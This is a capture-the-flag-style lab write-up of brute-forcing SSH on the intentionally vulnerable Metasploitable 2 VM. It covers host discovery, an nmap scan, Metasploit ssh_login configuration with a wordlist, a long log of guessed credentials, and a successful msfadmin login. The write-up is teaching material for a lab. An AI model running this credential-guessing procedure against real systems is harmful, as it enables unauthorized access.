# Metasploitable 2 SSH exploit write-up

Metasploitable 2 is Virtual Machine with many exploitable ports and now we are going to exploit it's one of exploit - **SSH**.



 > The target of this lab is use vulnerablitity in SSH service running in our Vulnerable VM to gain Root access.

## 1- Finding IP
 As the first step we are finding IP address of target machine - It's the VM located in our own LAN. 

 `sudo netdiscover -i eth 0` - for discovering all devices visible on ethernet 0.
```
 Currently scanning: 192.168.126.0/16   |   Screen View: Unique Hosts                                                                                    
                                                                                                                                                         
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                             
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 .
 192.168.43.95   00:0c:29:c8:07:4e      1      60  VMware, Inc.
 .
 ```

 ## 2- Enumeration
 In this step we'll find ports and services running on VM.
  
`sudo nmap -sS -sV  192.168.42.95 ` - with nmap tool we get all the open ports running on unlnerable VM.

```
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION

.
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
.
.
.
```

Now we use metasploit to search and exploit vulnerablity.

`sudo msfdb init && msfconsole`


Now, search **ssh_login**;

`msf6 > search ssh_login`

```
Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login         .                normal  No     SSH Login Check Scanner
   1  auxiliary/scanner/ssh/ssh_login_pubkey  .                normal  No     SSH Public Key Login Scanner
   ```

Run `msf6 > use 0` to use 0th option.

## Exploitaion:

Now to adjust setting of exploit we use `show options` and set following options:


Password File:
`msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE login.txt`

Remote Host (Target IP address):
`msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.43.95`

Stop when login:password found:
`sf6 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true`

Username File:
`msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE login.txt`

Verbose:
`msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE true`

> **login.txt** is text file consists of possible usernames and passwords

Check if everything adjusted;

`msf6 auxiliary(scanner/ssh/ssh_login) > show options`

```
Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   CreateSession     true             no        Create a new session for every successful login
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE         login.txt        no        File containing passwords, one per line
   RHOSTS            192.168.43.95    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   true             yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE     0                no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE         login.txt        no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts
   ```

   Now with all set, just hit `run`:

```
[*] 192.168.43.95:22 - Starting bruteforce
[-] 192.168.43.95:22 - Failed: 'admin:admin'
[-] 192.168.43.95:22 - Failed: 'admin:12345678'
[-] 192.168.43.95:22 - Failed: 'admin:minecraft'
[-] 192.168.43.95:22 - Failed: 'admin:juventus'
[-] 192.168.43.95:22 - Failed: 'admin:root'
[-] 192.168.43.95:22 - Failed: 'admin:sudo'
[-] 192.168.43.95:22 - Failed: 'admin:msfadmin'
[-] 192.168.43.95:22 - Failed: 'admin:password'
[-] 192.168.43.95:22 - Failed: 'admin:'
[-] 192.168.43.95:22 - Failed: '12345678:admin'
[-] 192.168.43.95:22 - Failed: '12345678:12345678'
[-] 192.168.43.95:22 - Failed: '12345678:minecraft'
[-] 192.168.43.95:22 - Failed: '12345678:juventus'
[-] 192.168.43.95:22 - Failed: '12345678:root'
[-] 192.168.43.95:22 - Failed: '12345678:sudo'
[-] 192.168.43.95:22 - Failed: '12345678:msfadmin'
[-] 192.168.43.95:22 - Failed: '12345678:password'
[-] 192.168.43.95:22 - Failed: '12345678:'
[-] 192.168.43.95:22 - Failed: 'minecraft:admin'
[-] 192.168.43.95:22 - Failed: 'minecraft:12345678'
[-] 192.168.43.95:22 - Failed: 'minecraft:minecraft'
[-] 192.168.43.95:22 - Failed: 'minecraft:juventus'
[-] 192.168.43.95:22 - Failed: 'minecraft:root'
[-] 192.168.43.95:22 - Failed: 'minecraft:sudo'
[-] 192.168.43.95:22 - Failed: 'minecraft:msfadmin'
[-] 192.168.43.95:22 - Failed: 'minecraft:password'
[-] 192.168.43.95:22 - Failed: 'minecraft:'
[-] 192.168.43.95:22 - Failed: 'juventus:admin'
[-] 192.168.43.95:22 - Failed: 'juventus:12345678'
[-] 192.168.43.95:22 - Failed: 'juventus:minecraft'
[-] 192.168.43.95:22 - Failed: 'juventus:juventus'
[-] 192.168.43.95:22 - Failed: 'juventus:root'
[-] 192.168.43.95:22 - Failed: 'juventus:sudo'
[-] 192.168.43.95:22 - Failed: 'juventus:msfadmin'
[-] 192.168.43.95:22 - Failed: 'juventus:password'
[-] 192.168.43.95:22 - Failed: 'juventus:'
[-] 192.168.43.95:22 - Failed: 'root:admin'
[-] 192.168.43.95:22 - Failed: 'root:12345678'
[-] 192.168.43.95:22 - Failed: 'root:minecraft'
[-] 192.168.43.95:22 - Failed: 'root:juventus'
[-] 192.168.43.95:22 - Failed: 'root:root'
[-] 192.168.43.95:22 - Failed: 'root:sudo'
[-] 192.168.43.95:22 - Failed: 'root:msfadmin'
[-] 192.168.43.95:22 - Failed: 'root:password'
[-] 192.168.43.95:22 - Failed: 'root:'
[-] 192.168.43.95:22 - Failed: 'sudo:admin'
[-] 192.168.43.95:22 - Failed: 'sudo:12345678'
[-] 192.168.43.95:22 - Failed: 'sudo:minecraft'
[-] 192.168.43.95:22 - Failed: 'sudo:juventus'
[-] 192.168.43.95:22 - Failed: 'sudo:root'
[-] 192.168.43.95:22 - Failed: 'sudo:sudo'
[-] 192.168.43.95:22 - Failed: 'sudo:msfadmin'
[-] 192.168.43.95:22 - Failed: 'sudo:password'
[-] 192.168.43.95:22 - Failed: 'sudo:'
[-] 192.168.43.95:22 - Failed: 'msfadmin:admin'
[-] 192.168.43.95:22 - Failed: 'msfadmin:12345678'
[-] 192.168.43.95:22 - Failed: 'msfadmin:minecraft'
[-] 192.168.43.95:22 - Failed: 'msfadmin:juventus'
[-] 192.168.43.95:22 - Failed: 'msfadmin:root'
[-] 192.168.43.95:22 - Failed: 'msfadmin:sudo'
[+] 192.168.43.95:22 - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(pl107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] SSH session 1 opened (192.168.43.132:41131 -> 192.168.43.95:22) at 2024-07-09 05:15:48 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> Username : msfadmin

>Password msfadmin

To login and gain machine access;

```
┌──(anyway㉿anyway)-[~]
└─$ ssh msfadmin@192.168.43.95
```

It will ask for password, enter password that we'd got, and that's it - We gained the access of machine!
